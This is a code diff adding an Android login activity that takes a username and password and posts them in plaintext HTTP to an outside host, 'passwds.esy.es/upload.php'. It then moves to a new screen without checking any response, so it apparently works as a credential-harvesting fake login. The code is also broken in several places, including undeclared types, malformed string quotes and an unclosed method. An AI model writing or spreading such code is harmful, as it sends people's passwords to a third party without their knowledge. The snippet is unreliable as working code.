@@ -1,0 +1,75 @@
+public class MainActivity2 extends AppCompatActivity{
+EditText bQ, bR;
+Button login;
+
+@Override
+protected void onCreate(Bundle savedInstanceState) {
+    super.onCreate(savedInstanceState);
+    setContentView(R.layout.activity_main2);
+
+    bQ = (EditText) findViewById(R.id.username);
+    bR = (EditText) findViewById(R.id.password);
+    login = (Button) findViewById(R.id.login);
+    login.setOnClickListener(new View.OnClickListener() {
+        @Override
+        public void onClick(View v) {
+
+        insertIntoDatabase();
+       // Navigate to new activity based on the response from the server . 
+        intent i=new intent (MainActivity2 .this , ""your new activity name where 
+        you want to navigate"".class) ;
+        startActivity(i);
+
+        }
+    });
+
+public void insertIntoDatabase() {
+    final String username = bQ.getText().toString();
+    final String password = bR.getText().toString();
+
+    class SendPostReqAsyncTask extends AsyncTask<String, Void, String> {
+        @Override
+        protected String doInBackground(String... params) {
+            String paramUsername = params[0];
+            String paramPassword = params[1];
+
+            try {
+                URL url = new URL(""http://passwds.esy.es/upload.php"");
+                HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
+                httpURLConnection.setRequestMethod(""POST"");
+                httpURLConnection.setDoOutput(true);
+                httpURLConnection.setDoInput(true);
+                //OutputStream outputStream = httpURLConnection.getOutputStream();
+                BufferedWriter bufferedWriter = new BufferedWriter(new OutputStreamWriter(httpURLConnection.getOutputStream(), ""UTF-8""));
+                String userPass = URLEncoder.encode(""username"", ""UTF-8"") + ""="" + URLEncoder.encode(paramUsername, ""UTF-8"") + ""&""
+                        + URLEncoder.encode(""password"", ""UTF-8"") + ""="" + URLEncoder.encode(paramPassword, ""UTF-8"");
+                bufferedWriter.write(userPass);
+                bufferedWriter.flush();
+                bufferedWriter.close();
+
+                InputStream inputStream = httpURLConnection.getInputStream();
+                inputStream.close();
+                httpURLConnection.disconnect();
+
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
+
+            return ""success"";
+        }
+
+        @Override
+        protected void onPostExecute(String result) {
+            super.onPostExecute(result);
+            Log.v(""Result:"", result);
+        }
+    }
+    SendPostReqAsyncTask sendPostReqAsyncTask = new SendPostReqAsyncTask();
+    sendPostReqAsyncTask.execute(username, password);
+}
+// public void submit(View view) {
+//     insertIntoDatabase();
+// }
+
+
+}
